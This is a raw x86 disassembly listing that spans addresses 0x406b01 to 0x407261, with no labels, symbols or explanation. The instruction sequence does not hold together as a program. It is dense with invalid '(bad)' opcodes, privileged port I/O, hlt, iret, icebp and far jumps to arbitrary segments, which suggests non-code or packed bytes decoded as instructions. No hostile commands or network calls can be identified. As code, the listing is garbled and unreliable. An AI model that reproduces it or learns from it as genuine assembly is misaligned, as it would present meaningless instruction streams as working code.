  406b01:	sbb    BYTE PTR [ecx+0x3b0ed5ea],dh
  406b07:	pop    es
  406b08:	push   cs
  406b09:	mul    DWORD PTR [eax+eiz*8-0x23027ef9]
  406b10:	jecxz  0x406b12
  406b12:	xchg   ecx,eax
  406b13:	in     al,0x2b
  406b15:	stc    
  406b16:	ins    BYTE PTR es:[edi],dx
  406b17:	lock in eax,dx
  406b19:	jae    0x406ada
  406b1b:	and    al,0x1f
  406b1d:	mov    bh,0x4e
  406b1f:	popa   
  406b20:	pop    ds
  406b21:	lock push ss
  406b23:	mov    esp,0x6a9cf98f
  406b28:	stos   DWORD PTR es:[edi],eax
  406b29:	int    0xab
  406b2b:	jnp    0x406b79
  406b2d:	fs call 0x5a311dfd
  406b33:	cmc    
  406b34:	mov    ds:0xbf429e3,al
  406b39:	inc    esp
  406b3a:	sub    BYTE PTR [ebx],bl
  406b3c:	push   esp
  406b3d:	retf   0x5608
  406b40:	mov    bl,0xd7
  406b42:	(bad)  
  406b44:	xlat   BYTE PTR ds:[ebx]
  406b45:	mov    ecx,0xf27e2570
  406b4a:	inc    ebx
  406b4b:	test   al,0xbe
  406b4d:	ins    BYTE PTR es:[edi],dx
  406b4e:	or     ah,cl
  406b50:	shl    DWORD PTR [ebx+ebx*2+0x2e],1
  406b54:	in     eax,dx
  406b55:	enter  0xa3c,0x77
  406b59:	pop    edi
  406b5a:	cwde   
  406b5b:	(bad)  
  406b5c:	xor    eax,ebx
  406b5e:	cmp    BYTE PTR [eax-0x42],dl
  406b61:	dec    edx
  406b62:	pop    ss
  406b63:	cli    
  406b64:	push   ds
  406b65:	pop    ecx
  406b67:	hlt    
  406b68:	pop    ebx
  406b69:	fist   DWORD PTR [eax+ecx*2+0x313be3e4]
  406b70:	out    0x19,al
  406b72:	pop    eax
  406b73:	jnp    0x406b3d
  406b75:	cld    
  406b76:	sbb    eax,0xdc2ba40f
  406b7b:	adc    al,0xec
  406b7d:	icebp  
  406b7e:	js     0x406bb9
  406b80:	sbb    ecx,DWORD PTR [ecx+0x7f57d827]
  406b86:	nop
  406b87:	mov    dl,0x2a
  406b89:	call   0x49281671
  406b8e:	outs   dx,DWORD PTR ds:[esi]
  406b8f:	adc    BYTE PTR [ebp+0x7],ch
  406b92:	mov    bh,BYTE PTR [ecx-0x51]
  406b95:	pop    edi
  406b96:	out    0x16,al
  406b98:	mov    edx,0xc964d052
  406b9d:	sub    eax,0x448e006d
  406ba2:	shl    ecx,cl
  406ba4:	mov    ah,BYTE PTR [edi]
  406ba6:	sub    eax,0xc941110a
  406bab:	(bad)  
  406bad:	and    BYTE PTR [ecx+0x3c],ah
  406bb0:	iret   
  406bb1:	fdiv   DWORD PTR [ecx]
  406bb3:	mov    ds:0x7f392bed,eax
  406bb8:	mov    dh,BYTE PTR [ebx-0xd9b4407]
  406bbe:	cmp    al,0x40
  406bc0:	lods   al,BYTE PTR ds:[esi]
  406bc1:	xchg   DWORD PTR [eax+0x35],ebx
  406bc4:	ss js  0x406b7e
  406bc7:	push   es
  406bc8:	mov    ebx,0xbe65e26f
  406bcd:	inc    esp
  406bce:	inc    esp
  406bcf:	or     dh,BYTE PTR [ebx-0x4d]
  406bd2:	push   0xffffff95
  406bd4:	imul   ebx,DWORD PTR [esi+0x2804cf02],0xffffffa5
  406bdb:	daa    
  406bdc:	ins    BYTE PTR es:[edi],dx
  406bdd:	mov    al,0x31
  406bdf:	dec    dl
  406be1:	(bad)  
  406be2:	sub    ecx,DWORD PTR [edx]
  406be4:	clc    
  406be5:	mov    edx,DWORD PTR [edx-0x5215bc09]
  406beb:	fist   DWORD PTR [esi+esi*8]
  406bee:	or     bl,al
  406bf0:	xor    BYTE PTR [esi+0x73],bh
  406bf3:	bound  ecx,QWORD PTR [ebp+ecx*1-0x7a]
  406bf7:	inc    edx
  406bf8:	sub    eax,0x439d5200
  406bfd:	jbe    0x406c07
  406bff:	fsub   QWORD PTR [ecx-0x55]
  406c02:	aas    
  406c03:	mov    esi,0xf61eb4be
  406c08:	sbb    bh,cl
  406c0a:	jns    0x406be8
  406c0c:	adc    edx,esp
  406c0e:	int3   
  406c0f:	dec    esp
  406c10:	sahf   
  406c11:	int    0xfc
  406c13:	call   0x534:0x95c5ee83
  406c1a:	pushf  
  406c1b:	mov    al,0xf6
  406c1d:	or     eax,0x458643b4
  406c22:	addr16 cmp eax,0x1339ac6c
  406c28:	jnp    0x406c48
  406c2a:	pop    ebx
  406c2b:	(bad)  
  406c2c:	(bad)  
  406c2d:	mov    ds:0x1f076fc,eax
  406c32:	fstp   TBYTE PTR [edx+0x163b2138]
  406c38:	out    0x30,eax
  406c3a:	cmc    
  406c3b:	pop    edx
  406c3c:	cmp    cl,BYTE PTR [ecx]
  406c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c3f:	sbb    ah,BYTE PTR [ecx-0x3c91d91e]
  406c45:	adc    DWORD PTR [edi+0x8],0x433dc978
  406c4c:	rcl    BYTE PTR [ebp+0x5e9efdb4],cl
  406c52:	pop    ebx
  406c53:	push   ss
  406c54:	jle    0x406beb
  406c56:	stos   DWORD PTR es:[edi],eax
  406c57:	sbb    BYTE PTR [edi+eax*4],cl
  406c5a:	xlat   BYTE PTR ds:[ebx]
  406c5b:	push   0x28
  406c5d:	jb     0x406be2
  406c5f:	jle    0x406c0c
  406c61:	and    ebp,ebp
  406c63:	in     eax,0x98
  406c65:	xor    eax,DWORD PTR [esp+eiz*8-0x8edeef1]
  406c6c:	push   0xfd1754af
  406c71:	pop    edi
  406c72:	xor    esp,DWORD PTR [edx+0x2e8b20cf]
  406c78:	or     DWORD PTR [esi+ebx*8+0x50],ebx
  406c7c:	push   edi
  406c7d:	jl     0x406c27
  406c7f:	ret    
  406c80:	cld    
  406c81:	push   edi
  406c82:	mov    bl,0x8f
  406c84:	aaa    
  406c85:	push   es
  406c86:	iret   
  406c87:	mov    edi,DWORD PTR [esp+edx*4-0x21ff381f]
  406c8e:	adc    dl,ch
  406c90:	mov    WORD PTR [ecx-0x2],ds
  406c93:	in     al,dx
  406c94:	mov    ebx,0xe44ad018
  406c99:	mul    BYTE PTR [edi+0x1804e331]
  406c9f:	fcom   DWORD PTR [edx+0x2cf6d188]
  406ca5:	(bad)  
  406ca6:	xchg   ebx,eax
  406ca7:	fnstsw WORD PTR [edi]
  406ca9:	mov    dl,0x5f
  406cab:	add    bl,BYTE PTR [ebp*2+0x5246c53a]
  406cb2:	imul   ebx,DWORD PTR [esi+0x6b],0xffffff94
  406cb6:	inc    eax
  406cb7:	stc    
  406cb8:	ror    BYTE PTR [ecx+0xc28e305],cl
  406cbe:	jae    0x406cb4
  406cc0:	pop    edx
  406cc1:	xor    al,0xdd
  406cc3:	out    dx,eax
  406cc4:	pop    ds
  406cc5:	int3   
  406cc6:	jbe    0x406d1f
  406cc8:	ror    DWORD PTR [esi+0x47356a29],1
  406cce:	lea    ebp,gs:[ebp+0xc]
  406cd2:	sub    BYTE PTR [edx+0x66ba106f],al
  406cd8:	lds    eax,FWORD PTR [edx]
  406cda:	xor    eax,0x6bec2570
  406cdf:	push   0xffffffca
  406ce1:	nop
  406ce2:	(bad)  
  406ce3:	cmp    DWORD PTR [edx+0x70],edx
  406ce6:	and    ebx,DWORD PTR [esi]
  406ce8:	jg     0x406cf5
  406cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ceb:	sub    ecx,0xc32301a4
  406cf1:	pop    edx
  406cf2:	xchg   BYTE PTR [ebx+0x6f],dl
  406cf5:	ja     0x406caf
  406cf7:	popa   
  406cf8:	inc    esp
  406cf9:	mov    al,ds:0xf8b7d10c
  406cfe:	mov    ecx,es
  406d00:	mov    bh,0xc
  406d02:	dec    ebp
  406d03:	mov    dh,0xc7
  406d05:	pop    esi
  406d06:	leave  
  406d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d08:	repz xchg ecx,eax
  406d0a:	or     BYTE PTR [ecx],dh
  406d0c:	sbb    BYTE PTR [eax-0xaf6616a],ah
  406d12:	int    0xa4
  406d14:	ret    0xf8cb
  406d17:	cmp    BYTE PTR [edi-0x483ab6a5],0xcc
  406d1e:	cmp    eax,ebp
  406d20:	fs xchg esi,eax
  406d22:	aaa    
  406d23:	shr    BYTE PTR [eax],cl
  406d25:	xlat   BYTE PTR ds:[bx]
  406d27:	out    0xa8,eax
  406d29:	cmp    BYTE PTR [ebp-0x50],cl
  406d2c:	mov    dh,0x7a
  406d2e:	outs   dx,BYTE PTR ds:[esi]
  406d2f:	aad    0x1
  406d31:	lahf   
  406d32:	outs   dx,BYTE PTR ds:[esi]
  406d33:	jmp    0x17a9df6e
  406d38:	inc    edi
  406d39:	mov    edi,0xbd427dc1
  406d3e:	test   DWORD PTR [ebx+edi*2-0x7a],ecx
  406d42:	fdiv   DWORD PTR [ecx+0x6dbd339e]
  406d48:	jg     0x406d43
  406d4a:	(bad)  
  406d4b:	pop    esp
  406d4c:	mov    ?,WORD PTR [ebp+edi*1+0x75]
  406d50:	bound  ebx,QWORD PTR [ecx]
  406d52:	sti    
  406d53:	call   0xd335:0xbaa5067
  406d5a:	mov    esp,0x20e860d4
  406d5f:	cmc    
  406d60:	repnz int3 
  406d62:	xchg   edx,eax
  406d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d64:	inc    ebp
  406d65:	cmc    
  406d66:	leave  
  406d67:	cli    
  406d68:	jnp    0x406db7
  406d6a:	lods   eax,DWORD PTR ds:[esi]
  406d6b:	(bad)  [esi]
  406d6d:	sub    eax,DWORD PTR [edi-0x1228c36f]
  406d73:	ret    
  406d74:	repz jo 0x406d87
  406d77:	inc    edi
  406d78:	adc    DWORD PTR [ecx],ebp
  406d7a:	movzx  edi,BYTE PTR [esi-0x72bf6bbe]
  406d81:	scas   eax,DWORD PTR es:[edi]
  406d82:	daa    
  406d83:	cdq    
  406d84:	jae    0x406d8f
  406d86:	pusha  
  406d87:	out    0x22,al
  406d89:	gs push ebp
  406d8b:	push   es
  406d8c:	jge    0x406d40
  406d8e:	daa    
  406d8f:	loop   0x406d36
  406d91:	cmp    edx,ecx
  406d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d94:	push   eax
  406d95:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  406d97:	sbb    ah,ah
  406d99:	ins    DWORD PTR es:[edi],dx
  406d9a:	inc    ebx
  406d9b:	and    al,0x91
  406d9d:	or     ch,BYTE PTR [edi+0x75cd4aa9]
  406da3:	sbb    BYTE PTR [ebp+0x6c],bl
  406da6:	xor    ebx,DWORD PTR [ebx-0x76]
  406da9:	xor    ah,BYTE PTR [edi*8+0x3fe1e8fb]
  406db0:	jg     0x406da4
  406db2:	pop    edx
  406db3:	push   eax
  406db4:	push   es
  406db5:	mov    ebp,0x175dea70
  406dba:	jmp    0xec10:0x76542134
  406dc1:	dec    esi
  406dc2:	sub    al,0x25
  406dc4:	test   DWORD PTR [esi+0x52fc2c4f],0xa4296772
  406dce:	lods   eax,DWORD PTR ds:[esi]
  406dcf:	sub    BYTE PTR [ebp-0x7b],al
  406dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dd3:	push   ss
  406dd4:	out    0x36,al
  406dd6:	push   esp
  406dd7:	inc    edi
  406dd8:	repnz pop esi
  406dda:	pop    ebp
  406ddb:	pushf  
  406ddc:	(bad)  
  406ddd:	aaa    
  406dde:	xchg   BYTE PTR [edx+esi*8+0x71c133f1],al
  406de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406de6:	scas   eax,DWORD PTR es:[edi]
  406de7:	push   ecx
  406de8:	dec    esi
  406de9:	inc    edx
  406dea:	xchg   esp,eax
  406deb:	pop    ebp
  406dec:	dec    ecx
  406ded:	mov    ds:0x67473552,eax
  406df2:	inc    ebx
  406df3:	in     al,0xc4
  406df5:	mov    ebp,0x3a8dbdda
  406dfa:	ja     0x406e24
  406dfc:	inc    edi
  406dfd:	mov    bl,0xef
  406dff:	add    BYTE PTR [ecx+ebp*1-0x6a],dl
  406e03:	jecxz  0x406e4f
  406e05:	pop    ds
  406e06:	sub    edx,DWORD PTR [ecx]
  406e08:	mov    ecx,0xcacbf176
  406e0d:	shr    BYTE PTR [edi+0x23],1
  406e10:	icebp  
  406e11:	fimul  DWORD PTR [edx]
  406e13:	or     eax,0xcdc788fb
  406e18:	push   edx
  406e19:	mov    ah,0x6c
  406e1b:	mov    bh,dl
  406e1d:	or     ch,BYTE PTR [ecx]
  406e1f:	in     eax,0x8
  406e21:	cmp    al,0xae
  406e23:	and    al,0xf
  406e25:	push   esi
  406e26:	pop    esi
  406e27:	jle    0x406e55
  406e29:	fadd   DWORD PTR [edx]
  406e2b:	jmp    0xb4c4:0xcb08c51b
  406e32:	inc    edi
  406e33:	test   DWORD PTR [esi-0x7b],esp
  406e36:	mov    eax,0xd3c942be
  406e3b:	xor    al,0x40
  406e3d:	sti    
  406e3e:	nop
  406e3f:	pop    edx
  406e40:	pop    ebx
  406e41:	jge    0x406e49
  406e43:	push   ss
  406e44:	inc    ebx
  406e45:	int3   
  406e46:	mov    esi,0x7e2de04a
  406e4b:	neg    DWORD PTR [esi-0x64660380]
  406e51:	rcl    esp,cl
  406e53:	mov    dl,0xb7
  406e55:	int3   
  406e56:	mov    ch,0xc2
  406e58:	stos   DWORD PTR es:[edi],eax
  406e59:	nop
  406e5a:	jge    0x406ed6
  406e5c:	push   0xffffffed
  406e5e:	sbb    dh,BYTE PTR gs:[eax-0x3d26c86e]
  406e65:	or     esp,DWORD PTR [ecx]
  406e67:	div    BYTE PTR [edx+0x5e]
  406e6a:	arpl   WORD PTR [esi-0x7a],si
  406e6d:	push   eax
  406e6e:	and    DWORD PTR [edi],0xffffffed
  406e71:	gs dec esp
  406e73:	sar    BYTE PTR [ebp-0x687fb9ea],1
  406e79:	(bad)  
  406e7a:	aaa    
  406e7b:	sti    
  406e7c:	sub    BYTE PTR [edi+edi*2-0x5],0x94
  406e81:	aas    
  406e82:	enter  0xdb3d,0x2a
  406e86:	and    ah,BYTE PTR [ebp+0x22]
  406e89:	out    0xc5,eax
  406e8b:	pop    edx
  406e8c:	mov    BYTE PTR [edi],bh
  406e8e:	shr    BYTE PTR [edi+0x22ec02ab],cl
  406e94:	or     ebx,eax
  406e96:	ror    BYTE PTR [ebx],0xa8
  406e99:	sar    dl,cl
  406e9b:	mov    al,ds:0x17fec095
  406ea0:	ins    DWORD PTR es:[edi],dx
  406ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ea2:	jg     0x406f12
  406ea4:	lock dec ebx
  406ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea7:	pop    eax
  406ea8:	nop
  406ea9:	lds    edx,FWORD PTR [edx+ecx*8+0x2a]
  406ead:	xor    eax,0x27ce1175
  406eb2:	das    
  406eb3:	stos   DWORD PTR es:[edi],eax
  406eb4:	xor    al,dh
  406eb6:	xor    eax,0x38d32c7e
  406ebb:	icebp  
  406ebc:	cmp    DWORD PTR [edi-0x2d30fcf6],edi
  406ec2:	in     eax,dx
  406ec3:	and    eax,ebp
  406ec5:	dec    eax
  406ec6:	or     edi,DWORD PTR [eax-0x14f27150]
  406ecc:	fadd   DWORD PTR [ecx-0x6af04e2f]
  406ed2:	ret    
  406ed3:	pcmpeqd mm4,mm5
  406ed6:	cli    
  406ed7:	in     eax,0x5c
  406ed9:	cld    
  406eda:	jns    0x406f2f
  406edc:	inc    esp
  406edd:	push   ds
  406ede:	sub    BYTE PTR [ebx+0x2a],0x69
  406ee2:	cmp    eax,edx
  406ee4:	xchg   ebx,eax
  406ee5:	ss fwait
  406ee7:	div    DWORD PTR [eax+eax*4]
  406eea:	pop    esp
  406eeb:	sahf   
  406eec:	ja     0x7549b79a
  406ef2:	cs mov ch,0xd7
  406ef5:	repz jbe 0x406ef9
  406ef8:	outs   dx,BYTE PTR ds:[esi]
  406ef9:	jnp    0x406ee6
  406efb:	ins    BYTE PTR es:[edi],dx
  406efc:	(bad)  
  406efd:	repz dec edx
  406eff:	xchg   DWORD PTR [bp+di-0x14],ebp
  406f03:	inc    esp
  406f04:	js     0x406ebd
  406f06:	adc    DWORD PTR [esi],esi
  406f08:	cmp    BYTE PTR [ecx],bl
  406f0a:	test   DWORD PTR [edi-0x4dd4e82d],edx
  406f10:	pop    ecx
  406f11:	push   ds
  406f12:	mov    eax,0xa1a538ee
  406f17:	fcom   DWORD PTR [edx+0x62]
  406f1a:	dec    ebx
  406f1b:	sub    ecx,DWORD PTR [edx-0x1]
  406f1e:	icebp  
  406f1f:	and    dl,ch
  406f21:	sbb    eax,0x323e3185
  406f26:	xchg   esp,eax
  406f27:	hlt    
  406f28:	mov    eax,0x72ac802f
  406f2d:	jl     0x406f5a
  406f2f:	mov    eax,0xba6b6670
  406f34:	lds    edi,FWORD PTR [edx+0x4cf32983]
  406f3a:	scas   eax,DWORD PTR es:[edi]
  406f3b:	jmp    0x8d6b:0xa7c559ee
  406f42:	jno    0x406f24
  406f44:	push   ebp
  406f45:	add    dh,dl
  406f47:	mov    dl,0x32
  406f49:	mov    dl,0x8
  406f4b:	cmp    ebx,DWORD PTR [esi]
  406f4d:	hlt    
  406f4e:	jmp    0x406fb5
  406f50:	shl    BYTE PTR [ecx+edx*1-0x26ee27fc],cl
  406f57:	in     al,dx
  406f58:	mov    esp,0xda541efa
  406f5d:	fidiv  WORD PTR [ecx]
  406f5f:	aas    
  406f60:	mov    eax,0x807427ef
  406f65:	adc    esp,DWORD PTR [esi]
  406f67:	imul   DWORD PTR [eax+0x32]
  406f6a:	rol    DWORD PTR [edi+0x3e],cl
  406f6d:	xchg   ecx,eax
  406f6e:	pop    esp
  406f6f:	inc    ebx
  406f70:	sar    al,cl
  406f72:	xchg   esi,eax
  406f73:	pusha  
  406f74:	rol    BYTE PTR [ebp+0x5],0xfa
  406f78:	popa   
  406f79:	popf   
  406f7a:	and    al,0xca
  406f7c:	pop    ebp
  406f7d:	push   ss
  406f7e:	test   al,0x3
  406f80:	rol    DWORD PTR [eax],cl
  406f82:	inc    esi
  406f83:	xor    esi,DWORD PTR [eax+0x88f311d]
  406f89:	cmc    
  406f8a:	shr    BYTE PTR [edi+0x31],cl
  406f8d:	test   esi,ebp
  406f8f:	fcmovnu st,st(2)
  406f91:	add    DWORD PTR [edx],esp
  406f93:	push   esp
  406f94:	mov    al,0x5
  406f96:	imul   edx,DWORD PTR [ecx+ebp*1],0x3f
  406f9a:	loop   0x406ffd
  406f9c:	jnp    0x406f82
  406f9e:	mov    eax,0xa632a141
  406fa3:	cli    
  406fa4:	xchg   ebp,eax
  406fa5:	jge    0x406fd5
  406fa7:	fnstcw WORD PTR [edi]
  406fa9:	mov    bl,0xd2
  406fab:	(bad)  
  406fac:	add    dh,bh
  406fae:	and    bl,ch
  406fb0:	ds mov ch,0xed
  406fb3:	add    BYTE PTR [edx],al
  406fb5:	xchg   ecx,eax
  406fb6:	cmp    ebp,eax
  406fb8:	mov    edi,ds
  406fba:	mov    eax,0x8631f5eb
  406fbf:	dec    esp
  406fc0:	dec    ebx
  406fc1:	test   ebx,ecx
  406fc3:	(bad)  [ebx]
  406fc5:	cs or  eax,0xb2b14b85
  406fcb:	pop    ds
  406fcc:	mov    bl,0xcb
  406fce:	or     BYTE PTR [edx],0x89
  406fd1:	daa    
  406fd2:	clc    
  406fd3:	js     0x406f62
  406fd5:	mov    ch,0x64
  406fd7:	and    bl,dh
  406fd9:	dec    ebx
  406fda:	sub    DWORD PTR [eax],ebp
  406fdc:	data16 sub al,0x3
  406fdf:	daa    
  406fe0:	lahf   
  406fe1:	mov    ecx,0x70ef90dc
  406fe6:	lea    ebx,[edi+0x5c]
  406fe9:	fs ja  0x40702b
  406fec:	push   ds
  406fed:	enter  0x834d,0x4b
  406ff1:	cmc    
  406ff2:	ror    BYTE PTR [esi],cl
  406ff4:	pushf  
  406ff5:	mov    ds:0xf359a6e8,al
  406ffa:	push   es
  406ffb:	cmp    dh,0xfd
  406ffe:	cdq    
  406fff:	mov    DWORD PTR [ebp+ebp*8+0x15],esi
  407003:	dec    ecx
  407004:	adc    al,0x7f
  407006:	xor    ch,BYTE PTR [ecx]
  407008:	bnd jmp 0x406fd9
  40700b:	push   esp
  40700c:	cmp    cl,ah
  40700e:	pop    ecx
  40700f:	vcvtsd2ss xmm5,xmm5,QWORD PTR [edx+0x53d902c6]
  407017:	xor    edi,DWORD PTR [eax]
  407019:	ret    0xb6bf
  40701c:	or     bh,BYTE PTR [edx]
  40701e:	sahf   
  40701f:	ret    
  407020:	inc    edx
  407021:	rcr    BYTE PTR [ebp-0x76],cl
  407024:	push   0xffffffd9
  407026:	cmp    cl,BYTE PTR [esi-0x2d]
  407029:	outs   dx,DWORD PTR ds:[esi]
  40702a:	mov    al,ds:0x396bd8a4
  40702f:	hlt    
  407030:	xchg   esp,eax
  407031:	inc    ebx
  407032:	fistp  WORD PTR [eax+0x5d]
  407035:	xchg   esi,eax
  407036:	leave  
  407037:	clc    
  407038:	popa   
  407039:	xor    edx,DWORD PTR [edi+0x7a4ccd7d]
  40703f:	pop    ss
  407040:	out    dx,eax
  407041:	retf   
  407042:	aad    0xc8
  407044:	jg     0x40709a
  407046:	or     al,0x2c
  407048:	int3   
  407049:	mov    edx,0x68030ca9
  40704e:	enter  0x9ec1,0xa6
  407052:	dec    DWORD PTR [ecx+0x23]
  407055:	add    ah,BYTE PTR [ebx]
  407057:	jle    0x407013
  407059:	repnz into 
  40705b:	adc    al,0xda
  40705d:	les    esi,FWORD PTR [ebx-0x19]
  407060:	(bad)  
  407061:	mov    eax,0xe1ed875e
  407066:	fnsave [edx-0xd]
  407069:	push   esp
  40706a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40706b:	pop    edi
  40706c:	jae    0x40709a
  40706e:	mov    bh,0x87
  407070:	pop    es
  407071:	nop
  407072:	or     ecx,eax
  407074:	sub    dh,cl
  407076:	sahf   
  407077:	jns    0x407067
  407079:	scas   eax,DWORD PTR es:[edi]
  40707a:	cli    
  40707b:	jmp    0x407040
  40707d:	pop    edi
  40707e:	mov    bl,0x4
  407080:	jl     0x4070aa
  407082:	cmp    al,0xba
  407084:	adc    dl,cl
  407086:	push   ebp
  407087:	and    al,0xa6
  407089:	cdq    
  40708a:	dec    eax
  40708b:	dec    eax
  40708c:	push   0x678b78f9
  407091:	push   0x4bdf72e4
  407096:	add    esp,DWORD PTR [eax+0x3a]
  407099:	inc    eax
  40709a:	icebp  
  40709b:	push   edx
  40709c:	and    dh,dh
  40709e:	dec    edx
  40709f:	mov    esp,0x68bf1147
  4070a4:	pop    ds
  4070a5:	cmp    al,0xcf
  4070a7:	xchg   edx,eax
  4070a8:	shl    bl,0x46
  4070ab:	inc    ebp
  4070ac:	popa   
  4070ad:	dec    edi
  4070ae:	jp     0x4070b1
  4070b0:	or     DWORD PTR ds:0xb83b7783,ecx
  4070b6:	std    
  4070b7:	pop    ecx
  4070b8:	std    
  4070b9:	xor    eax,0xc0569249
  4070be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070bf:	sahf   
  4070c0:	push   ecx
  4070c1:	jo     0x40710d
  4070c3:	or     bh,BYTE PTR [ecx+0x1a]
  4070c6:	xor    al,0xb
  4070c8:	jge    0x407122
  4070ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070cb:	inc    edx
  4070cc:	bound  eax,QWORD PTR [ebx]
  4070ce:	mov    DWORD PTR [eax-0x4d9edf4a],esi
  4070d4:	or     DWORD PTR [edx+ebx*1],edx
  4070d7:	pop    ss
  4070d8:	push   es
  4070d9:	in     eax,dx
  4070da:	pop    edi
  4070db:	jmp    0x407063
  4070dd:	mov    DWORD PTR [ecx-0x64],ecx
  4070e0:	pop    eax
  4070e1:	lock push ds
  4070e3:	leave  
  4070e4:	inc    esi
  4070e5:	(bad)  
  4070e6:	push   esp
  4070e7:	push   ss
  4070e8:	xor    BYTE PTR ds:0xe4d7c61a,bl
  4070ee:	xchg   ecx,eax
  4070ef:	sub    eax,0x6001f657
  4070f4:	inc    ecx
  4070f5:	jg     0x4070a3
  4070f7:	push   0xfb3ec601
  4070fc:	adc    bh,al
  4070fe:	push   ss
  4070ff:	push   es
  407100:	adc    al,0x7e
  407102:	stos   BYTE PTR es:[edi],al
  407103:	sub    ebp,edi
  407105:	int3   
  407106:	gs int 0xc5
  407109:	mov    eax,ds:0x43e03fb4
  40710e:	xor    DWORD PTR [esp+esi*2],eax
  407111:	outs   dx,BYTE PTR ds:[esi]
  407112:	ret    
  407113:	jns    0x407143
  407115:	fstp   TBYTE PTR [edi-0x18a6e304]
  40711b:	mov    BYTE PTR [ecx+0x73a3b4d6],cl
  407121:	call   0x5d464625
  407126:	xor    ah,dl
  407128:	xchg   esp,eax
  407129:	push   ecx
  40712a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40712b:	fld    DWORD PTR [ebx+0x4c1ae9ec]
  407131:	pop    ebx
  407132:	jl     0x40718e
  407134:	dec    edx
  407135:	rol    BYTE PTR [ebp-0x7b],1
  407138:	fcmovne st,st(6)
  40713a:	xchg   ebx,eax
  40713b:	mov    bl,0x60
  40713d:	(bad)  
  40713e:	push   cs
  40713f:	shr    ebp,1
  407141:	js     0x40711f
  407143:	xchg   edx,eax
  407144:	sbb    cl,0x1a
  407147:	sbb    eax,0x363f6132
  40714c:	jbe    0x4070e8
  40714e:	les    edi,FWORD PTR es:[ebp+0x40]
  407152:	scas   al,BYTE PTR es:[edi]
  407153:	loop   0x40715a
  407155:	mov    ah,0x9a
  407157:	sahf   
  407158:	addr16 enterw 0x96a8,0xe9
  40715e:	dec    esp
  40715f:	mov    cl,0x51
  407161:	mov    cl,BYTE PTR [ecx-0x48]
  407164:	and    eax,0x7ece3185
  407169:	jns    0x40719b
  40716b:	pushf  
  40716c:	mov    edx,0x2d305a54
  407171:	cmp    cl,BYTE PTR [edi]
  407173:	sbb    al,0x68
  407175:	push   ebp
  407176:	push   0x9
  407178:	jg     0x407158
  40717a:	sbb    ch,bh
  40717c:	popa   
  40717d:	mov    al,ds:0x8ca92fb0
  407182:	xchg   edi,eax
  407183:	pop    edi
  407184:	adc    BYTE PTR [eax+0x294befd6],ah
  40718a:	push   esp
  40718b:	arpl   WORD PTR [ebx-0x48],sp
  40718e:	push   es
  40718f:	xor    DWORD PTR [esi-0x476c5fd2],edx
  407195:	aam    0x71
  407197:	push   edi
  407198:	sbb    edi,DWORD PTR [eax]
  40719a:	jno    0x4071cb
  40719c:	(bad)  
  40719d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40719e:	aas    
  40719f:	mov    ecx,0xba490640
  4071a4:	mov    ah,0xa6
  4071a6:	sub    bl,cl
  4071a8:	mov    eax,ecx
  4071aa:	sbb    eax,0xe534db48
  4071af:	in     al,0x23
  4071b1:	idiv   DWORD PTR [ecx+esi*4]
  4071b4:	sub    DWORD PTR [ecx],0x62
  4071b7:	push   edi
  4071b8:	cwde   
  4071b9:	je     0x4071c9
  4071bb:	inc    ebx
  4071bc:	adc    esi,DWORD PTR [edx-0x7d10405d]
  4071c2:	sub    DWORD PTR [esi+0x7c2d66fc],esi
  4071c8:	ret    
  4071c9:	mov    dl,0x44
  4071cb:	loop   0x40716d
  4071cd:	cs in  eax,dx
  4071cf:	es jg  0x4071e0
  4071d2:	and    eax,0x5ca03e8c
  4071d7:	pop    ebx
  4071d8:	pop    ebp
  4071d9:	pop    esi
  4071da:	jne    0x407226
  4071dc:	inc    esi
  4071dd:	pop    ebx
  4071de:	lods   eax,DWORD PTR ds:[esi]
  4071df:	das    
  4071e0:	sub    DWORD PTR [eax],eax
  4071e2:	jmp    0x5b8e:0x421f7a6d
  4071e9:	pop    ebp
  4071ea:	pop    eax
  4071eb:	mov    esi,0x47bfe4ce
  4071f0:	xchg   BYTE PTR [ebx-0x17],ah
  4071f3:	mov    dl,0x9a
  4071f5:	pop    ecx
  4071f6:	call   0x8c41f82
  4071fb:	js     0x407245
  4071fd:	(bad)  [edi-0x58b7fa9e]
  407203:	lahf   
  407204:	idiv   DWORD PTR [edx-0x67]
  407207:	sti    
  407208:	retf   0x51e
  40720b:	jmp    0x2dc9c7fa
  407210:	ins    DWORD PTR es:[edi],dx
  407211:	je     0x407281
  407213:	sub    ebp,DWORD PTR [ecx-0x35384b17]
  407219:	popa   
  40721a:	pop    esp
  40721b:	sub    dh,BYTE PTR [ebx+0x58]
  40721e:	dec    esp
  40721f:	adc    al,ch
  407221:	out    dx,eax
  407222:	push   DWORD PTR [esi+0xd]
  407225:	cmp    edx,ebx
  407227:	shr    DWORD PTR [edi-0xbf83b5f],cl
  40722d:	mov    edi,0xca889485
  407232:	icebp  
  407233:	aaa    
  407234:	xchg   ecx,eax
  407235:	xchg   ebx,eax
  407236:	mov    bh,0x7f
  407238:	iret   
  407239:	ror    BYTE PTR [edi+0x27],1
  40723c:	inc    esp
  40723d:	lods   eax,DWORD PTR ds:[esi]
  40723e:	gs div esi
  407241:	cmp    al,0x89
  407243:	pop    esp
  407244:	je     0x407200
  407246:	out    0xf6,eax
  407248:	push   0xa8af742a
  40724d:	lods   eax,DWORD PTR ds:[esi]
  40724e:	and    BYTE PTR [ebx+0x6f47cd44],0xcb
  407255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407256:	div    ebp
  407258:	popf   
  407259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40725a:	nop
  40725b:	out    dx,eax
  40725c:	out    dx,eax
  40725d:	(bad)  
  40725e:	dec    ebp
  40725f:	mov    ah,0x2e
  407261:	xchg   edx,eax
